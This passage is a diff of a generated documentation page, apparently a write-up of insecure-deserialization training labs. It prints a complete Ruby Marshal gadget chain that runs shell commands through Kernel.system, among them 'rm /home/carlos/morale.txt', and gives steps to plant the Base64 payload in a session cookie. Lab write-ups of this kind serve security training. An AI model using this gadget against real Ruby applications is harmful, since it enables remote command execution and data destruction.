+<span class="normal"><a href="#__codelineno-14-18">18</a></span>
+<span class="normal"><a href="#__codelineno-14-19">19</a></span>
+<span class="normal"><a href="#__codelineno-14-20">20</a></span>
+<span class="normal"><a href="#__codelineno-14-21">21</a></span>
+<span class="normal"><a href="#__codelineno-14-22">22</a></span>
+<span class="normal"><a href="#__codelineno-14-23">23</a></span>
+<span class="normal"><a href="#__codelineno-14-24">24</a></span>
+<span class="normal"><a href="#__codelineno-14-25">25</a></span>
+<span class="normal"><a href="#__codelineno-14-26">26</a></span>
+<span class="normal"><a href="#__codelineno-14-27">27</a></span>
+<span class="normal"><a href="#__codelineno-14-28">28</a></span>
+<span class="normal"><a href="#__codelineno-14-29">29</a></span>
+<span class="normal"><a href="#__codelineno-14-30">30</a></span>
+<span class="normal"><a href="#__codelineno-14-31">31</a></span>
+<span class="normal"><a href="#__codelineno-14-32">32</a></span>
+<span class="normal"><a href="#__codelineno-14-33">33</a></span>
+<span class="normal"><a href="#__codelineno-14-34">34</a></span>
+<span class="normal"><a href="#__codelineno-14-35">35</a></span>
+<span class="normal"><a href="#__codelineno-14-36">36</a></span>
+<span class="normal"><a href="#__codelineno-14-37">37</a></span>
+<span class="normal"><a href="#__codelineno-14-38">38</a></span>
+<span class="normal"><a href="#__codelineno-14-39">39</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a># Autoload the required classes
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>Gem::SpecFetcher
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a>Gem::Installer
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5"></a># prevent the payload from running when we Marshal.dump it
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6"></a>module Gem
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7"></a>  class Requirement
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8"></a>    def marshal_dump
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9"></a>      [@requirements]
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10"></a>    end
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11"></a>  end
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12"></a>end
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13"></a>
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14"></a>wa1 = Net::WriteAdapter.new(Kernel, :system)
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15"></a>
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16"></a>rs = Gem::RequestSet.allocate
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17"></a>rs.instance_variable_set(&#39;@sets&#39;, wa1)
+</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18"></a>rs.instance_variable_set(&#39;@git_set&#39;, &quot;id&quot;)
+</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19"></a>
+</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20"></a>wa2 = Net::WriteAdapter.new(rs, :resolve)
+</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21"></a>
+</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22"></a>i = Gem::Package::TarReader::Entry.allocate
+</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23"></a>i.instance_variable_set(&#39;@read&#39;, 0)
+</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24"></a>i.instance_variable_set(&#39;@header&#39;, &quot;aaa&quot;)
+</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25"></a>
+</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26"></a>
+</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27"></a>n = Net::BufferedIO.allocate
+</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28"></a>n.instance_variable_set(&#39;@io&#39;, i)
+</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29"></a>n.instance_variable_set(&#39;@debug_output&#39;, wa2)
+</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30"></a>
+</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31"></a>t = Gem::Package::TarReader.allocate
+</span><span id="__span-14-32"><a id="__codelineno-14-32" name="__codelineno-14-32"></a>t.instance_variable_set(&#39;@io&#39;, n)
+</span><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33"></a>
+</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34"></a>r = Gem::Requirement.allocate
+</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35"></a>r.instance_variable_set(&#39;@requirements&#39;, t)
+</span><span id="__span-14-36"><a id="__codelineno-14-36" name="__codelineno-14-36"></a>
+</span><span id="__span-14-37"><a id="__codelineno-14-37" name="__codelineno-14-37"></a>payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+</span><span id="__span-14-38"><a id="__codelineno-14-38" name="__codelineno-14-38"></a>puts payload.inspect
+</span><span id="__span-14-39"><a id="__codelineno-14-39" name="__codelineno-14-39"></a>puts Marshal.load(payload)
+</span></code></pre></div></td></tr></table></div>
 <p><strong>4.</strong> And modify it:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a># Autoload the required classes
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>Gem::SpecFetcher
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Gem::Installer
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a># prevent the payload from running when we Marshal.dump it
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>module Gem
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>  class Requirement
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>    def marshal_dump
-</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>      [@requirements]
-</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>    end
-</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>  end
-</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>end
-</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>
-</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>wa1 = Net::WriteAdapter.new(Kernel, :system)
-</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>
-</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>rs = Gem::RequestSet.allocate
-</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>rs.instance_variable_set(&#39;@sets&#39;, wa1)
-</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>rs.instance_variable_set(&#39;@git_set&#39;, &quot;rm /home/carlos/morale.txt&quot;)
-</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>
-</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>wa2 = Net::WriteAdapter.new(rs, :resolve)
-</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>
-</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>i = Gem::Package::TarReader::Entry.allocate
-</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>i.instance_variable_set(&#39;@read&#39;, 0)
-</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>i.instance_variable_set(&#39;@header&#39;, &quot;aaa&quot;)
-</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>
-</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>
-</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>n = Net::BufferedIO.allocate
-</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>n.instance_variable_set(&#39;@io&#39;, i)
-</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>n.instance_variable_set(&#39;@debug_output&#39;, wa2)
-</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>
-</span><span id="__span-15-31"><a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a>t = Gem::Package::TarReader.allocate
-</span><span id="__span-15-32"><a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a>t.instance_variable_set(&#39;@io&#39;, n)
-</span><span id="__span-15-33"><a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a>
-</span><span id="__span-15-34"><a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a>r = Gem::Requirement.allocate
-</span><span id="__span-15-35"><a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a>r.instance_variable_set(&#39;@requirements&#39;, t)
-</span><span id="__span-15-36"><a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a>
-</span><span id="__span-15-37"><a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a>payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
-</span><span id="__span-15-38"><a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a>puts Base64.encode64(payload)
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-15-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-15-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-15-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-15-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-15-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-15-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-15-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-15-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-15-10">10</a></span>
+<span class="normal"><a href="#__codelineno-15-11">11</a></span>
+<span class="normal"><a href="#__codelineno-15-12">12</a></span>
+<span class="normal"><a href="#__codelineno-15-13">13</a></span>
+<span class="normal"><a href="#__codelineno-15-14">14</a></span>
+<span class="normal"><a href="#__codelineno-15-15">15</a></span>
+<span class="normal"><a href="#__codelineno-15-16">16</a></span>
+<span class="normal"><a href="#__codelineno-15-17">17</a></span>
+<span class="normal"><a href="#__codelineno-15-18">18</a></span>
+<span class="normal"><a href="#__codelineno-15-19">19</a></span>
+<span class="normal"><a href="#__codelineno-15-20">20</a></span>
+<span class="normal"><a href="#__codelineno-15-21">21</a></span>
+<span class="normal"><a href="#__codelineno-15-22">22</a></span>
+<span class="normal"><a href="#__codelineno-15-23">23</a></span>
+<span class="normal"><a href="#__codelineno-15-24">24</a></span>
+<span class="normal"><a href="#__codelineno-15-25">25</a></span>
+<span class="normal"><a href="#__codelineno-15-26">26</a></span>
+<span class="normal"><a href="#__codelineno-15-27">27</a></span>
+<span class="normal"><a href="#__codelineno-15-28">28</a></span>
+<span class="normal"><a href="#__codelineno-15-29">29</a></span>
+<span class="normal"><a href="#__codelineno-15-30">30</a></span>
+<span class="normal"><a href="#__codelineno-15-31">31</a></span>
+<span class="normal"><a href="#__codelineno-15-32">32</a></span>
+<span class="normal"><a href="#__codelineno-15-33">33</a></span>
+<span class="normal"><a href="#__codelineno-15-34">34</a></span>
+<span class="normal"><a href="#__codelineno-15-35">35</a></span>
+<span class="normal"><a href="#__codelineno-15-36">36</a></span>
+<span class="normal"><a href="#__codelineno-15-37">37</a></span>
+<span class="normal"><a href="#__codelineno-15-38">38</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a># Autoload the required classes
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>Gem::SpecFetcher
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a>Gem::Installer
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5"></a># prevent the payload from running when we Marshal.dump it
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6"></a>module Gem
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7"></a>  class Requirement
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8"></a>    def marshal_dump
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9"></a>      [@requirements]
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10"></a>    end
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11"></a>  end
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12"></a>end
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13"></a>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14"></a>wa1 = Net::WriteAdapter.new(Kernel, :system)
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15"></a>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16"></a>rs = Gem::RequestSet.allocate
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17"></a>rs.instance_variable_set(&#39;@sets&#39;, wa1)
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18"></a>rs.instance_variable_set(&#39;@git_set&#39;, &quot;rm /home/carlos/morale.txt&quot;)
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19"></a>
+</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20"></a>wa2 = Net::WriteAdapter.new(rs, :resolve)
+</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21"></a>
+</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22"></a>i = Gem::Package::TarReader::Entry.allocate
+</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23"></a>i.instance_variable_set(&#39;@read&#39;, 0)
+</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24"></a>i.instance_variable_set(&#39;@header&#39;, &quot;aaa&quot;)
+</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25"></a>
+</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26"></a>
+</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27"></a>n = Net::BufferedIO.allocate
+</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28"></a>n.instance_variable_set(&#39;@io&#39;, i)
+</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29"></a>n.instance_variable_set(&#39;@debug_output&#39;, wa2)
+</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30"></a>
+</span><span id="__span-15-31"><a id="__codelineno-15-31" name="__codelineno-15-31"></a>t = Gem::Package::TarReader.allocate
+</span><span id="__span-15-32"><a id="__codelineno-15-32" name="__codelineno-15-32"></a>t.instance_variable_set(&#39;@io&#39;, n)
+</span><span id="__span-15-33"><a id="__codelineno-15-33" name="__codelineno-15-33"></a>
+</span><span id="__span-15-34"><a id="__codelineno-15-34" name="__codelineno-15-34"></a>r = Gem::Requirement.allocate
+</span><span id="__span-15-35"><a id="__codelineno-15-35" name="__codelineno-15-35"></a>r.instance_variable_set(&#39;@requirements&#39;, t)
+</span><span id="__span-15-36"><a id="__codelineno-15-36" name="__codelineno-15-36"></a>
+</span><span id="__span-15-37"><a id="__codelineno-15-37" name="__codelineno-15-37"></a>payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+</span><span id="__span-15-38"><a id="__codelineno-15-38" name="__codelineno-15-38"></a>puts Base64.encode64(payload)
+</span></code></pre></div></td></tr></table></div>
 <p>Changes made: </p>
 <ul>
 <li>Last two lines to puts Base64.encode64(payload)</li>
@@ -17950,37 +18136,45 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><img alt="Insecure deserialization" src="../../img/indes_24.png" /></p>
 <p><strong>6.</strong> Paste the generated payload into the session cookie in the repeater and have sent the request.</p>
 <p><img alt="Insecure deserialization" src="../../img/indes_25.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a># Burp solution
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>1. Log in to your own account and notice that the session cookie contains a serialized (&quot;marshaled&quot;) Ruby object. Send a request containing this session cookie to Burp Repeater.
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>2. Browse the web to find the `Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`. Copy the final script for generating the payload.
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>3. Modify the script as follows:
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>    - Change the command that should be executed from `id` to `rm /home/carlos/morale.txt`.
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>    - Replace the final two lines with `puts Base64.encode64(payload)`. This ensures that the payload is output in the correct format for you to use for the lab.
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>4. Run the script and copy the resulting Base64-encoded object.
-</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>5. In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it.
-</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>6. Send the request to solve the lab.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
+<span class="normal"><a href="#__codelineno-16-2">2</a></span>
+<span class="normal"><a href="#__codelineno-16-3">3</a></span>
+<span class="normal"><a href="#__codelineno-16-4">4</a></span>
+<span class="normal"><a href="#__codelineno-16-5">5</a></span>
+<span class="normal"><a href="#__codelineno-16-6">6</a></span>
+<span class="normal"><a href="#__codelineno-16-7">7</a></span>
+<span class="normal"><a href="#__codelineno-16-8">8</a></span>
+<span class="normal"><a href="#__codelineno-16-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a># Burp solution
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>1. Log in to your own account and notice that the session cookie contains a serialized (&quot;marshaled&quot;) Ruby object. Send a request containing this session cookie to Burp Repeater.
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>2. Browse the web to find the `Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`. Copy the final script for generating the payload.
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a>3. Modify the script as follows:
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a>    - Change the command that should be executed from `id` to `rm /home/carlos/morale.txt`.
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6"></a>    - Replace the final two lines with `puts Base64.encode64(payload)`. This ensures that the payload is output in the correct format for you to use for the lab.
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7"></a>4. Run the script and copy the resulting Base64-encoded object.
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8"></a>5. In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it.
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9"></a>6. Send the request to solve the lab.
+</span></code></pre></div></td></tr></table></div>
 <h2 id="j">J</h2>
 <h3 id="enunciation_7">Enunciation</h3>
 <p>T</p>
 <h3 id="solution_7">Solution</h3>
 <p><img alt="Insecure deserialization" src="" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a># Burp solution
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a># Burp solution
+</span></code></pre></div></td></tr></table></div>
 <h2 id="j_1">J</h2>
 <h3 id="enunciation_8">Enunciation</h3>
 <p>T</p>
 <h3 id="solution_8">Solution</h3>
 <p><img alt="Insecure deserialization" src="" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a># Burp solution
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a># Burp solution
+</span></code></pre></div></td></tr></table></div>
 <h2 id="j_2">J</h2>
 <h3 id="enunciation_9">Enunciation</h3>
 <p>T</p>
 <h3 id="solution_9">Solution</h3>
 <p><img alt="Insecure deserialization" src="" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a># Burp solution
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a># Burp solution
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -18056,7 +18250,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
